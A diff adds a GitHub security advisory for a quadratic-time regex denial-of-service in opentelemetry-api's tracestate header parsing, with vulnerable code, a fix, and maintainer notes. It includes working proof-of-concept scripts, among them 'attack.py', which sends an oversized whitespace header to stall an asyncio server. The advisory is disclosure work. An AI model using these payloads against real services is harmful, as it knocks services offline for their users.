@@ -1,0 +1,149 @@
+{
+  "id": "GHSA-xcq7-p3pf-p88h",
+  "modified": "2026-10-22T16:30:40.999595074Z",
+  "published": "2026-10-22T16:22:07Z",
+  "aliases": [
+    "CVE-2026-114603"
+  ],
+  "summary": "OpenTelemetry Python: Unbounded tracestate parsing in opentelemetry-api",
+  "details": "## Summary\n`TraceState.from_header` splits the inbound W3C `tracestate` header with a regular expression that starts with an unbounded optional-whitespace run, and no length limit is applied first. A run of spaces or tabs that is not followed by a comma costs O(N²) CPU. A single unauthenticated request with a ~100 KB `tracestate` keeps the handling worker busy for ~6 s (spaces) to ~12 s (tabs); under an asyncio server it blocks every other connection for that time.\n\n## Affected component / version\n- Package: `opentelemetry-api` (pip) — `opentelemetry/trace/span.py` (`TraceState.from_header`), reached from `opentelemetry/trace/propagation/tracecontext.py` (`TraceContextTextMapPropagator.extract`).\n- Confirmed in `main` (5e8083e8) and in the v1.44.0 and v1.45.0 tags; the same pattern is present back to v1.0.0 (introduced by #1599, March 2021). Not exhaustively verified against every release in between.\n- Reachable with the default propagators (`OTEL_PROPAGATORS` defaults to `tracecontext,baggage`) from any server instrumentation that calls `propagate.extract()`, for example `opentelemetry-instrumentation-asgi`.\n\n## Details\n\n1. The header reaches the parser without any length check:\n\n```python\n# opentelemetry-api/src/opentelemetry/trace/propagation/tracecontext.py:57\ntracestate_headers = getter.get(carrier, self._TRACESTATE_HEADER_NAME)  # \u003c-- attacker-controlled request header(s), any size\nif tracestate_headers is None:\n    tracestate = None\nelse:\n    tracestate = TraceState.from_header(tracestate_headers)             # \u003c-- no length check before parsing (line 61)\n```\n\n2. The split pattern and the parser:\n```python\n# opentelemetry-api/src/opentelemetry/trace/span.py:45\n_TRACECONTEXT_MAXIMUM_TRACESTATE_KEYS = 32            # \u003c-- only enforced later, in TraceState.__init__, after the split\n_delimiter_pattern = re.compile(r\"[ \\t]*,[ \\t]*\")      # \u003c-- (line 46) starts with an unbounded [ \\t]*\n\n# span.py:382\n@classmethod\ndef from_header(cls, header_list: list[str]) -\u003e TraceState:\n    pairs = {}  # type: dict[str, str]\n    for header in header_list:\n        members: list[str] = re.split(_delimiter_pattern, header)   # \u003c-- (line 400) VULNERABLE: O(N^2) on \"a=b\" + \" \" * N + \"x\"\n        for member in members:\n            if not member:\n                continue\n            match = _member_pattern.fullmatch(member)\n            if not match:\n                _logger.warning(                                    # \u003c-- also logs the entire malformed member (up to the whole header)\n                    \"Member doesn't match the w3c identifiers format %s\",\n                    member,\n                )\n                return cls()\n            ...\n```\n\n`re.split` tries the pattern at every offset. At each offset inside a whitespace run, `[ \\t]*` consumes the rest of the run, finds no `,`, backtracks and fails, then the engine moves one character forward and repeats. N characters × up to N steps each = O(N²). The 32-member limit never gets a chance to run because `split` has to finish first.\n\n3. The sibling propagator already has the missing guard:\n```python\n# baggage/propagation/__init__.py:68\n_MAX_HEADER_LENGTH = 8192\n...\nif len(header.encode()) \u003e self._MAX_HEADER_LENGTH:   # \u003c-- (line 93) rejected before any regex runs; tracestate has no equivalent\n    _logger.warning(...)\n    return context\n```\n\nA 16 KiB header costs ≈ 0.25 s and an 8 KiB header ≈ 0.07 s.\nMeasured cost of `extract()` on one core (valid `traceparent`, `tracestate: \"a=b\" + N spaces + \"x\"`): the time quadruples each time N doubles (see the proof of concept). Roughly 0.06 s at 10,000 characters, 1 s at 40,000, 4 s at 80,000, 9 s at 100,000 (tabs are about 1.6× slower). \n\nWhether a server lets such a header through (header-size limits, tested): gunicorn rejects ≥ 8190 bytes (response code 431); `uvicorn --http h11` rejects above 16 KiB (400); waitress accepts up to 256 KiB (200 KB accepted, 300 KB rejected); `uvicorn --http httptools` — the default parser with `uvicorn[standard]` — accepted 300 KB, 1 MB, 5 MB and 20 MB `tracestate` headers.\n\n## Proof of concept\n\n### A. Show the quadratic cost (no server needed)\n\n1. Install the API: `pip install opentelemetry-api` (any version from 1.0 up to the current main is affected).\n2. Save as `poc_tracestate.py`:\n```python\nimport logging\nimport time\n\nfrom opentelemetry.trace.propagation.tracecontext import TraceContextTextMapPropagator\n\n# The library logs the whole malformed member at WARNING; silence it so the timings stay readable.\nlogging.disable(logging.CRITICAL)\n\nTRACEPARENT = \"00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01\"\npropagator = TraceContextTextMapPropagator()\n\nprevious = None\nfor n in (10_000, 20_000, 40_000, 80_000):\n    # N spaces after a valid member, no comma anywhere in the header\n    carrier = {\"traceparent\": TRACEPARENT, \"tracestate\": \"a=b\" + \" \" * n + \"x\"}\n    start = time.perf_counter()\n    propagator.extract(carrier)\n    elapsed = time.perf_counter() - start\n    growth = f\"x{elapsed / previous:.1f}\" if previous else \"-\"\n    print(f\"{n:\u003e7} characters  {elapsed:6.2f} s  growth when size doubles: {growth}\")\n    previous = elapsed\n```\n3. Run `python poc_tracestate.py`.\n4. **What to observe:** the time grows by about **×4 every time the input size doubles** (a linear parser would show ×2). Absolute numbers depend on the CPU; the growth factor does not. Our run:\n```\n  10000 characters    0.06 s  growth when size doubles: -\n  20000 characters    0.26 s  growth when size doubles: x4.0\n  40000 characters    1.04 s  growth when size doubles: x4.0\n  80000 characters    4.13 s  growth when size doubles: x4.0\n```\nReplace `\" \"` with `\"\\t\"` to see ≈1.6× longer.\n\n### B. Show that one request stalls a real server\nThis uses `OpenTelemetryMiddleware` from `opentelemetry-instrumentation-asgi` around a trivial ASGI app and the default `uvicorn[standard]` parser (httptools).\n\n1. Install: `pip install opentelemetry-api opentelemetry-instrumentation-asgi \"uvicorn[standard]\"`.\n2. Save as `app.py`:\n```python\nfrom opentelemetry.instrumentation.asgi import OpenTelemetryMiddleware\n\n\nasync def app(scope, receive, send):\n    await send({\"type\": \"http.response.start\", \"status\": 200, \"headers\": [(b\"content-type\", b\"text/plain\")]})\n    await send({\"type\": \"http.response.body\", \"body\": b\"ok\"})\n\n\napp = OpenTelemetryMiddleware(app)\n```\n3. Start the server in one terminal: `uvicorn app:app --host 127.0.0.1 --port 8000 --http httptools`\n4. Save as `attack.py`:\n```python\n\"\"\"Send one oversized tracestate request and, while it is being handled,\nmeasure how long an unrelated request to the same server has to wait.\"\"\"\nimport socket\nimport sys\nimport threading\nimport time\n\nHOST, PORT = \"127.0.0.1\", 8000\nN = int(sys.argv[1]) if len(sys.argv) \u003e 1 else 100_000\nTRACEPARENT = \"00-0af7651916cd43dd8448eb211c80319c-b7ad6b7169203331-01\"\n\n\ndef get(path, extra=\"\"):\n    s = socket.create_connection((HOST, PORT), timeout=120)\n    s.sendall(f\"GET {path} HTTP/1.1\\r\\nHost: x\\r\\nConnection: close\\r\\n{extra}\\r\\n\".encode())\n    start, data = time.perf_counter(), b\"\"\n    while chunk := s.recv(65536):\n        data += chunk\n    return time.perf_counter() - start, data.split(b\"\\r\\n\")[0].decode()\n\n\nresult = {}\nextra = f\"traceparent: {TRACEPARENT}\\r\\ntracestate: a=b{' ' * N}x\\r\\n\"\nattacker = threading.Thread(target=lambda: result.update(a=get(\"/attack\", extra)))\nprint(\"idle /ping:               %.3f s  %s\" % get(\"/ping\"))\nattacker.start()\ntime.sleep(0.5)  # let the attack request reach the server first\nprint(\"/ping during the attack:  %.3f s  %s\" % get(\"/ping\"))\nattacker.join()\nprint(\"attack request itself:    %.3f s  %s\" % result[\"a\"])\n```\n5. In a second terminal run `python attack.py 100000`.\n6. **What to observe:** the idle `/ping` answers in milliseconds, but a `/ping` sent half a second *after* the attack request has to wait for the attack request to finish, even though it is a different, innocent request. Our run:\n```\nidle /ping:               0.000 s  HTTP/1.1 200 OK\n/ping during the attack:  5.909 s  HTTP/1.1 200 OK     \u003c-- unrelated request delayed ~6 s (event loop blocked)\nattack request itself:    6.408 s  HTTP/1.1 200 OK\n```\n7. Start the server with `--http h11` instead and run the same command: the attack request is rejected immediately (`400 Bad Request`, h11 header cap) and `/ping` is not delayed. Our measurements for `--http httptools`: 30,000 spaces → 0.59 s; 100,000 spaces → 6.57 s with the concurrent `/ping` delayed 6.07 s; 100,000 tabs → 12.39 s with the concurrent `/ping` delayed 11.89 s.\n\n## Severity\n**Likelihood: Low.** Any unauthenticated client can trigger it with one request on the default propagators, but only on servers that accept headers larger than roughly 16–30 KB.\n\n**Impact: Medium.** One request of about 100 KB costs 6–12 s of server CPU and, under an asyncio server, stalls every other connection for that time; repeating it keeps the service unavailable.\n\n**Severity: Medium.**\n\n## Suggested remediation\nReplace the regex split with a plain `split` and strip; this removes the quadratic behaviour and is equivalent on valid input:\n```diff\n--- a/opentelemetry-api/src/opentelemetry/trace/span.py\n+++ b/opentelemetry-api/src/opentelemetry/trace/span.py\n@@ def from_header(cls, header_list: list[str]) -\u003e TraceState:\n         for header in header_list:\n-            members: list[str] = re.split(_delimiter_pattern, header)\n+            members: list[str] = [m.strip(\" \\t\") for m in header.split(\",\")]\n```\n`_delimiter_pattern` (line 46) is then unused and can be removed. We also suggest rejecting a header longer than the W3C limit (512 characters for the list) before parsing, the way the baggage propagator does with `_MAX_HEADER_LENGTH`. On valid input the two forms return identical members (empty members preserved); the only behaviour change is that a header with leading whitespace is now accepted instead of producing an empty `TraceState`, which is more spec-compliant. Cost at N = 100,000 drops from ~9 s to ~5e-5 s.\n\n## Credit\n\nDiscovered and reported by SecDim Security Research\nsecdim.com | @secdim | security@secdim.com\n\n---\n\n**FROM MAINTAINERS**\n\n## Summary\n\n`TraceState.from_header()` in `opentelemetry-api` used a regular-expression-based operation whose processing time could grow disproportionately when parsing specially crafted inbound `tracestate` headers.\n\nBecause W3C Trace Context is enabled by default in OpenTelemetry Python, services accepting untrusted propagation headers could spend excessive CPU time processing a single request.\n\n## Impact\n\nServices accepting untrusted inbound propagation headers may experience increased per-request CPU usage when processing malformed `tracestate` values. In synchronous servers, this may keep a worker occupied. In asynchronous servers, CPU-intensive parsing may delay other requests handled by the same event loop.\n\nThe practical impact depends on the HTTP server, HTTP parser, and any upstream request-header limits. Common servers and proxies may reject oversized headers before they reach the application, while custom carriers or deployments with increased header limits may accept substantially larger values.\n\nUnlike optional propagation formats, W3C Trace Context is part of the default OpenTelemetry Python propagation configuration.\n\nThe impact is limited to availability. This issue does not expose or modify telemetry data and does not allow code execution.\n\n## Patches\n\nVersions of `opentelemetry-api` up to and including `1.45.0` are affected.\n\nUpgrade `opentelemetry-api` to version `1.45.1` or later.\n\nVersion `1.45.1` replaces the affected parsing operation with linear-time processing and discards combined `tracestate` headers longer than 8,192 characters.\n\n## Workarounds\n\nEnsure HTTP header size limits are configured at the server or gateway level. Most Python HTTP servers enforce an 8 KiB header limit by default, which mitigates external attack vectors independently of this fix.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "opentelemetry-api",
+        "purl": "pkg:pypi/opentelemetry-api"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.45.1"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.10b0",
+        "0.11b0",
+        "0.12b0",
+        "0.13b0",
+        "0.14b0",
+        "0.15b0",
+        "0.16b0",
+        "0.16b1",
+        "0.17b0",
+        "0.1a0",
+        "0.2a0",
+        "0.3a0",
+        "0.4a0",
+        "0.4a1",
+        "0.5b0",
+        "0.6b0",
+        "0.7b0",
+        "0.7b1",
+        "0.8b0",
+        "0.9b0",
+        "1.0.0",
+        "1.0.0rc1",
+        "1.1.0",
+        "1.10.0",
+        "1.10a0",
+        "1.11.0",
+        "1.11.1",
+        "1.12.0",
+        "1.12.0rc1",
+        "1.12.0rc2",
+        "1.13.0",
+        "1.14.0",
+        "1.15.0",
+        "1.16.0",
+        "1.17.0",
+        "1.18.0",
+        "1.19.0",
+        "1.2.0",
+        "1.20.0",
+        "1.21.0",
+        "1.22.0",
+        "1.23.0",
+        "1.24.0",
+        "1.25.0",
+        "1.26.0",
+        "1.27.0",
+        "1.28.0",
+        "1.28.1",
+        "1.28.2",
+        "1.29.0",
+        "1.3.0",
+        "1.30.0",
+        "1.31.0",
+        "1.31.1",
+        "1.32.0",
+        "1.32.1",
+        "1.33.0",
+        "1.33.1",
+        "1.34.0",
+        "1.34.1",
+        "1.35.0",
+        "1.36.0",
+        "1.37.0",
+        "1.38.0",
+        "1.39.0",
+        "1.39.1",
+        "1.4.0",
+        "1.4.1",
+        "1.40.0",
+        "1.41.0",
+        "1.41.1",
+        "1.42.0",
+        "1.42.1",
+        "1.43.0",
+        "1.44.0",
+        "1.45.0",
+        "1.5.0",
+        "1.6.0",
+        "1.6.1",
+        "1.6.2",
+        "1.7.0",
+        "1.7.1",
+        "1.8.0",
+        "1.9.0",
+        "1.9.1"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.45.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-xcq7-p3pf-p88h/GHSA-xcq7-p3pf-p88h.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-telemetry/opentelemetry-python/security/advisories/GHSA-xcq7-p3pf-p88h"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-telemetry/opentelemetry-python/pull/5749"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-telemetry/opentelemetry-python/commit/d5224bf4ffdf2aee1b592ad238dcc32ca957f26b"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/open-telemetry/opentelemetry-python"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-telemetry/opentelemetry-python/blob/main/CHANGELOG.md#version-1451066b1-2026-10-06"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/open-telemetry/opentelemetry-python/releases/tag/v1.45.1"
+    }
+  ]
+}
